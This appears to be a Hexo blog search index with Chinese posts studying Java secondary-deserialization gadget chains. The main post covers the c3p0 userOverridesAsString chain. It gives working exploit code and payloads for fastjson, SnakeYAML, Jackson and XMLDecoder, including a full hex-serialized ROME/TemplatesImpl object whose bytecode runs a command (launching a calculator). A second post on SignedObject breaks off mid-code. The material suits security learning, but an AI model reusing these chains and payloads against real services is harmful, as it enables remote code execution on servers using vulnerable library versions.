<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>二次反序列化学习(二)</title>
    <link href="/2024/01/19/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-%E4%BA%8C/"/>
    <url>/2024/01/19/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-%E4%BA%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="二次反序列化学习（二）"><a href="#二次反序列化学习（二）" class="headerlink" title="二次反序列化学习（二）"></a>二次反序列化学习（二）</h1><p>网络安全在线讨口子</p><p><img src="image-20240119214240522.png" alt="image-20240119214240522"></p><h2 id="c3p0"><a href="#c3p0" class="headerlink" title="c3p0"></a>c3p0</h2><p>​c3p0是用于创建和管理连接，利用“池”的方式复用连接减少资源开销，和其他数据源一样，也具有连接数控制、连接可靠性测试、连接泄露控制、缓存语句等功能。</p><h3 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h3><p>com&#x2F;mchange&#x2F;v2&#x2F;c3p0&#x2F;impl&#x2F;WrapperConnectionPoolDataSourceBase.java</p><p><img src="image-20240119221947295.png" alt="image-20240119221947295"></p><p><img src="image-20240119220920017.png" alt="image-20240119220920017"></p><p>这个类的javaBean有个userOverridesAsString。还是个抽象类。</p><p>主要判断传的值和userOverridesAsString属性值是否相等或者其中一个为null就会执行if代码块</p><p>java&#x2F;beans&#x2F;VetoableChangeSupport.java#fireVetoableChange()</p><p><img src="image-20240119222708517.png" alt="image-20240119222708517"></p><p><img src="image-20240119222719297.png" alt="image-20240119222719297"></p><p>进行赋值。</p><p><img src="image-20240119222428577.png" alt="image-20240119222428577"></p><p><img src="image-20240119222505926.png" alt="image-20240119222505926"></p><p>com&#x2F;mchange&#x2F;v2&#x2F;c3p0&#x2F;WrapperConnectionPoolDataSource.java#vetoableChange()</p><p><img src="image-20240119222956907.png" alt="image-20240119222956907"></p><p>然后获取里event的newvalue。</p><p>com&#x2F;mchange&#x2F;v2&#x2F;c3p0&#x2F;impl&#x2F;C3P0ImplUtils.java#parseUserOverridesAsString()</p><p><img src="image-20240119223053628.png" alt="image-20240119223053628"></p><p>然后就是获取到的newvalue进行截取。</p><p><img src="image-20240119223320091.png" alt="image-20240119223320091"></p><p><img src="image-20240119223433557.png" alt="image-20240119223433557"></p><p>注意这里的索引，所以HexAsciiSerializedMap和最后面要补一位字符。hex是2字节。</p><p>然后把截取的hex转byte数组。</p><p><img src="image-20240119223744487.png" alt="image-20240119223744487"></p><p>然后就是进行反序列化。</p><p>由于WrapperConnectionPoolDataSource这个类是抽象类，所以我们要找一个继承这个类，然后没有setUserOverridesAsString()这个方法。这样我们调用setUserOverridesAsString时就会去找抽象类的这个方法。</p><p><strong>com&#x2F;mchange&#x2F;v2&#x2F;c3p0&#x2F;WrapperConnectionPoolDataSource.java</strong></p><p>这个类符合这个条件</p><p><img src="image-20240119224142472.png" alt="image-20240119224142472"></p><h3 id="0x02-一些触发链"><a href="#0x02-一些触发链" class="headerlink" title="0x02 一些触发链"></a>0x02 一些触发链</h3><p>​我们知道fastjson、snayaml、json反序列化都是调用javaBean的set方法。所以就有一下exp</p><h4 id="一、fastjson"><a href="#一、fastjson" class="headerlink" title="一、fastjson &lt;&#x3D;1.2.47 反序列化"></a>一、fastjson &lt;&#x3D;1.2.47 反序列化</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">        <span class="hljs-type">String</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> fileToHex(<span class="hljs-string">&quot;rome&quot;</span>);<br><span class="hljs-comment">//        一、fastjson触发，1.2.47一下。属实鸡肋～</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">json</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;rand1\&quot;: &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;: \&quot;java.lang.Class\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;val\&quot;: \&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;rand2\&quot;: &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;: \&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;userOverridesAsString\&quot;: \&quot;HexAsciiSerializedMap2&quot;</span>+exp+<span class="hljs-string">&quot;2\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#125;\n&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        JSON.parseObject(json);<br></code></pre></td></tr></table></figure><p><img src="image-20240119225953014.png" alt="image-20240119225953014"></p><p>占位符，随便写个1字符都行</p><h4 id="二、snakeyaml-反序列化-（不用SafeConstructor构造）"><a href="#二、snakeyaml-反序列化-（不用SafeConstructor构造）" class="headerlink" title="二、snakeyaml 反序列化 （不用SafeConstructor构造）"></a>二、snakeyaml 反序列化 （不用SafeConstructor构造）</h4><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-comment">//       二、利用snakeyaml触发，只要 snakeyaml构造器没有使用SafeConstructor就可以触发，相对fastjson，但是yaml反序列一般都在后台，只能说半斤八两。</span><br>        <span class="hljs-keyword">String</span> payload = <span class="hljs-string">&quot;!!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\n&quot;</span> +<br>                <span class="hljs-string">&quot;userOverridesAsString: HexAsciiSerializedMap@&quot;</span> + exp + <span class="hljs-string">&#x27;@&#x27;</span>;<br><br><span class="hljs-comment">//        SafeConstructor safeConstructor = new SafeConstructor();</span><br><span class="hljs-comment">//        Yaml yaml = new Yaml(safeConstructor);</span><br>        Yaml yaml = <span class="hljs-keyword">new</span> <span class="hljs-type">Yaml</span>();<br>        yaml.load(payload);<br></code></pre></td></tr></table></figure><h4 id="三、Jackson-2-8-10反序列化-更加鸡肋"><a href="#三、Jackson-2-8-10反序列化-更加鸡肋" class="headerlink" title="三、Jackson &lt; 2.8.10反序列化 更加鸡肋"></a>三、Jackson &lt; 2.8.10反序列化 更加鸡肋</h4><p>Jackson-databind 支持 <a href="https://github.com/FasterXML/jackson-docs/wiki/JacksonPolymorphicDeserialization">Polymorphic Deserialization</a> 特性（默认情况下不开启）。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java">        <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">public</span> Object object;<br>&#125;<br><span class="hljs-type">String</span> <span class="hljs-variable">poc</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;object\&quot;:[\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,&#123;\&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot;</span>+ exp + <span class="hljs-string">&quot;;\&quot;&#125;]&#125;&quot;</span>;<br>        System.out.println(poc);<br>        <span class="hljs-type">ObjectMapper</span> <span class="hljs-variable">objectMapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectMapper</span>();<br>        objectMapper.enableDefaultTyping();<br>        objectMapper.readValue(poc, Person.class);<br>    &#125;<br><br></code></pre></td></tr></table></figure><h4 id="四、XML反序列-（说实话都xml反序列化了，随便干了）"><a href="#四、XML反序列-（说实话都xml反序列化了，随便干了）" class="headerlink" title="四、XML反序列 （说实话都xml反序列化了，随便干了）"></a>四、XML反序列 （说实话都xml反序列化了，随便干了）</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;calc.xml&quot;</span>);<br><span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(file);<br><span class="hljs-type">BufferedInputStream</span> <span class="hljs-variable">bis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(fis);<br><span class="hljs-type">XMLDecoder</span> <span class="hljs-variable">xmlDecoder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLDecoder</span>(bis);<br>xmlDecoder.readObject();<br>xmlDecoder.close();<br></code></pre></td></tr></table></figure><p>xmlpoc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;java&gt;<br>    &lt;object class=<span class="hljs-string">&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;</span>&gt;<br>        &lt;<span class="hljs-keyword">void</span> method=<span class="hljs-string">&quot;setUserOverridesAsString&quot;</span>&gt;<br>                &lt;string&gt;HexAsciiSerializedMap:aced00057372002e6a617661782e6d616e6167656d656e742e42616441747472696275746556616c7565457870457863657074696f6ed4e7daab632d46400200014c000376616c7400124c6a6176612f6c616e672f4f626a6563743b787200136a6176612e6c616e672e457863657074696f6ed0fd1f3e1a3b1cc4020000787200136a6176612e6c616e672e5468726f7761626c65d5c635273977b8cb0300044c000563617573657400154c6a6176612f6c616e672f5468726f7761626c653b4c000d64657461696c4d6573736167657400124c6a6176612f6c616e672f537472696e673b5b000a737461636b547261636574001e5b4c6a6176612f6c616e672f537461636b5472616365456c656d656e743b4c001473757070726573736564457863657074696f6e737400104c6a6176612f7574696c2f4c6973743b787071007e0008707572001e5b4c6a6176612e6c616e672e537461636b5472616365456c656d656e743b02462a3c3cfd22390200007870000000017372001b6a6176612e6c616e672e537461636b5472616365456c656d656e746109c59a2636dd8502000449000a6c696e654e756d6265724c000e6465636c6172696e67436c61737371007e00054c000866696c654e616d6571007e00054c000a6d6574686f644e616d6571007e000578700000003774000c636f6d2e7365722e526f6d65740009526f6d652e6a6176617400046d61696e737200266a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c654c697374fc0f2531b5ec8e100200014c00046c69737471007e00077872002c6a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c65436f6c6c656374696f6e19420080cb5ef71e0200014c0001637400164c6a6176612f7574696c2f436f6c6c656374696f6e3b7870737200136a6176612e7574696c2e41727261794c6973747881d21d99c7619d03000149000473697a657870000000007704000000007871007e0015787372002a636f6d2e73756e2e73796e6469636174696f6e2e666565642e696d706c2e546f537472696e674265616e09f58e4a0f23ee310200024c000a5f6265616e436c6173737400114c6a6176612f6c616e672f436c6173733b4c00045f6f626a71007e000178707672001d6a617661782e786d6c2e7472616e73666f726d2e54656d706c61746573000000000000000000000078707372003a636f6d2e73756e2e6f72672e6170616368652e78616c616e2e696e7465726e616c2e78736c74632e747261782e54656d706c61746573496d706c09574fc16eacab3303000649000d5f696e64656e744e756d62657249000e5f7472616e736c6574496e6465785b000a5f62797465636f6465737400035b5b425b00065f636c6173737400125b4c6a6176612f6c616e672f436c6173733b4c00055f6e616d6571007e00054c00115f6f757470757450726f706572746965737400164c6a6176612f7574696c2f50726f706572746965733b787000000000ffffffff757200035b5b424bfd19156767db37020000787000000001757200025b42acf317f8060854e0020000787000000192cafebabe000000340019010005726f6d6531070001010040636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f72756e74696d652f41627374726163745472616e736c65740700030100083c636c696e69743e010003282956010004436f64650100116a6176612f6c616e672f52756e74696d6507000801000a67657452756e74696d6501001528294c6a6176612f6c616e672f52756e74696d653b0c000a000b0a0009000c0100126f70656e202d612063616c63756c61746f7208000e01000465786563010027284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f50726f636573733b0c001000110a000900120100063c696e69743e0c001400060a0004001501000a536f7572636546696c6501000a726f6d65312e6a6176610021000200040000000000020008000500060001000700000016000200000000000ab8000d120fb6001357b100000000000100140006000100070000001100010001000000052ab70016b10000000000010017000000020018707400046e616d657077010078;&lt;/string&gt;<br>        &lt;/<span class="hljs-keyword">void</span>&gt;<br>    &lt;/object&gt;<br>&lt;/java&gt;<br></code></pre></td></tr></table></figure><p>水平有限，列出四种触发，纯纯鸡肋。</p><h3 id="0x03-完整exp"><a href="#0x03-完整exp" class="headerlink" title="0x03 完整exp"></a>0x03 完整exp</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.towser;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;<br><span class="hljs-keyword">import</span> com.mchange.v2.c3p0.WrapperConnectionPoolDataSource;<br><span class="hljs-keyword">import</span> org.yaml.snakeyaml.Yaml;<br><br><br><span class="hljs-keyword">import</span> java.beans.XMLDecoder;<br><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">public</span> Object object;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">c3p0_fastjson</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> fileToHex(<span class="hljs-string">&quot;rome&quot;</span>);<br><span class="hljs-comment">//        一、fastjson触发，1.2.47一下。属实鸡肋～</span><br><span class="hljs-comment">//        String json =&quot;&#123;\n&quot; +</span><br><span class="hljs-comment">//                &quot;    \&quot;rand1\&quot;: &#123;\n&quot; +</span><br><span class="hljs-comment">//                &quot;        \&quot;@type\&quot;: \&quot;java.lang.Class\&quot;,\n&quot; +</span><br><span class="hljs-comment">//                &quot;        \&quot;val\&quot;: \&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;\n&quot; +</span><br><span class="hljs-comment">//                &quot;    &#125;,\n&quot; +</span><br><span class="hljs-comment">//                &quot;    \&quot;rand2\&quot;: &#123;\n&quot; +</span><br><span class="hljs-comment">//                &quot;        \&quot;@type\&quot;: \&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,\n&quot; +</span><br><span class="hljs-comment">//                &quot;        \&quot;userOverridesAsString\&quot;: \&quot;HexAsciiSerializedMap?&quot;+exp+&quot;?\&quot;,\n&quot; +</span><br><span class="hljs-comment">//                &quot;    &#125;\n&quot; +</span><br><span class="hljs-comment">//                &quot;&#125;&quot;;</span><br><span class="hljs-comment">//        JSON.parseObject(json);</span><br><br><span class="hljs-comment">//       二、利用snakeyaml触发，只要 snakeyaml构造器没有使用SafeConstructor就可以触发，相对fastjson，但是yaml反序列一般都在后台，只能说半斤八两。</span><br><span class="hljs-comment">//        String payload = &quot;!!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\n&quot; +</span><br><span class="hljs-comment">//                &quot;userOverridesAsString: HexAsciiSerializedMap@&quot; + exp + &#x27;@&#x27;;</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">////        SafeConstructor safeConstructor = new SafeConstructor();</span><br><span class="hljs-comment">////        Yaml yaml = new Yaml(safeConstructor);</span><br><span class="hljs-comment">//        Yaml yaml = new Yaml();</span><br><span class="hljs-comment">//        yaml.load(payload);</span><br><br><span class="hljs-comment">//        三、Jackson &lt; 2.8.10反序列化</span><br><span class="hljs-comment">//        String poc = &quot;&#123;\&quot;object\&quot;:[\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,&#123;\&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot;+ exp + &quot;;\&quot;&#125;]&#125;&quot;;</span><br><span class="hljs-comment">//        System.out.println(poc);</span><br><span class="hljs-comment">//        ObjectMapper objectMapper = new ObjectMapper();</span><br><span class="hljs-comment">//        objectMapper.enableDefaultTyping();</span><br><span class="hljs-comment">//        objectMapper.readValue(poc, Person.class);</span><br><span class="hljs-comment">//        四、XML反序列化 天大的鸡肋，纯凑数</span><br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;calc.xml&quot;</span>);<br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(file);<br>        <span class="hljs-type">BufferedInputStream</span> <span class="hljs-variable">bis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(fis);<br>        <span class="hljs-type">XMLDecoder</span> <span class="hljs-variable">xmlDecoder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLDecoder</span>(bis);<br>        xmlDecoder.readObject();<br>        xmlDecoder.close();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">fileToHex</span><span class="hljs-params">(String filePath)</span> &#123;<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">hexBuilder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br><br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filePath)) &#123;<br>            <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>            <span class="hljs-type">int</span> bytesRead;<br><br>            <span class="hljs-keyword">while</span> ((bytesRead = fis.read(buffer)) != -<span class="hljs-number">1</span>) &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">hex</span> <span class="hljs-operator">=</span> bytesToHex(buffer, bytesRead);<br>                hexBuilder.append(hex);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> hexBuilder.toString();<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">bytesToHex</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes, <span class="hljs-type">int</span> length)</span> &#123;<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(length * <span class="hljs-number">2</span>);<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; length; i++) &#123;<br>            sb.append(Character.forDigit((bytes[i] &gt;&gt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">0xF</span>, <span class="hljs-number">16</span>));<br>            sb.append(Character.forDigit((bytes[i] &amp; <span class="hljs-number">0xF</span>), <span class="hljs-number">16</span>));<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> sb.toString();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>Xml-poc</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">java</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;setUserOverridesAsString&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">java</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;setUserOverridesAsString&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>HexAsciiSerializedMap:SEROBJHEX;<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">java</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">java</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h3><p>​怎么看c3p0的二次都很鸡肋。24年了，只能说ctf专项吧。</p><h2 id="抄作业链接"><a href="#抄作业链接" class="headerlink" title="抄作业链接"></a>抄作业链接</h2><p><a href="https://xz.aliyun.com/t/10728">https://xz.aliyun.com/t/10728</a></p><p><a href="https://tttang.com/archive/1701/#toc__7">https://tttang.com/archive/1701/#toc__7</a></p><p><a href="http://moonflower.fun/index.php/2022/04/18/316/">http://moonflower.fun/index.php/2022/04/18/316/</a></p><p><a href="https://johnfrod.top/%E5%AE%89%E5%85%A8/xmldecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://johnfrod.top/%E5%AE%89%E5%85%A8/xmldecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>java反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>二次反序列化学习（一）</title>
    <link href="/2024/01/17/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/"/>
    <url>/2024/01/17/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="二次反序列化学习（一）"><a href="#二次反序列化学习（一）" class="headerlink" title="二次反序列化学习（一）"></a>二次反序列化学习（一）</h2><p>为了更好找到银行驻场，随学习二次反序列化。</p><p><img src="v2-e88049215a67c7ab818b07354e26e58a_xl.jpg" alt="img"></p><h2 id="SignedObject"><a href="#SignedObject" class="headerlink" title="SignedObject"></a>SignedObject</h2><h3 id="0x01-SignedObject分析"><a href="#0x01-SignedObject分析" class="headerlink" title="0x01 SignedObject分析"></a>0x01 SignedObject分析</h3><p>比较简单。可以序列化，fied可控。太完美了，早入行几年就好了。</p><p>java&#x2F;security&#x2F;SignedObject.java#getObject()</p><p><img src="image-20240117020703509.png" alt="image-20240117020703509"></p><p><img src="image-20240117020654623.png" alt="image-20240117020654623"></p><p>可以看到这个从content获取流然后进行反序列化。</p><p><img src="image-20240117020950838.png" alt="image-20240117020950838"></p><p>content是一个byte数组。继承ser。那么无非就是反射赋值，或者构造函数赋值。</p><p><img src="image-20240117021123904.png" alt="image-20240117021123904"></p><p>构造函数pubilc，直接new就完事了，然后触发getObject()就行。很容易想到jackson，fastjson，cb等来触发javabean的getter来进行触发。</p><p>java&#x2F;security&#x2F;Signature.java#Map()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">static</span> Map&lt;String,Boolean&gt; signatureInfo;<br><br><span class="hljs-keyword">static</span> &#123;<br>    signatureInfo = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;String,Boolean&gt;();<br>    <span class="hljs-type">Boolean</span> <span class="hljs-variable">TRUE</span> <span class="hljs-operator">=</span> Boolean.TRUE;<br>    <span class="hljs-comment">// pre-initialize with values for our SignatureSpi implementations</span><br>    signatureInfo.put(<span class="hljs-string">&quot;sun.security.provider.DSA$RawDSA&quot;</span>, TRUE);<br>    signatureInfo.put(<span class="hljs-string">&quot;sun.security.provider.DSA$SHA1withDSA&quot;</span>, TRUE);<br>    signatureInfo.put(<span class="hljs-string">&quot;sun.security.rsa.RSASignature$MD2withRSA&quot;</span>, TRUE);<br>    signatureInfo.put(<span class="hljs-string">&quot;sun.security.rsa.RSASignature$MD5withRSA&quot;</span>, TRUE);<br>    signatureInfo.put(<span class="hljs-string">&quot;sun.security.rsa.RSASignature$SHA1withRSA&quot;</span>, TRUE);<br>    signatureInfo.put(<span class="hljs-string">&quot;sun.security.rsa.RSASignature$SHA256withRSA&quot;</span>, TRUE);<br>    signatureInfo.put(<span class="hljs-string">&quot;sun.security.rsa.RSASignature$SHA384withRSA&quot;</span>, TRUE);<br>    signatureInfo.put(<span class="hljs-string">&quot;sun.security.rsa.RSASignature$SHA512withRSA&quot;</span>, TRUE);<br>    signatureInfo.put(<span class="hljs-string">&quot;com.sun.net.ssl.internal.ssl.RSASignature&quot;</span>, TRUE);<br>    signatureInfo.put(<span 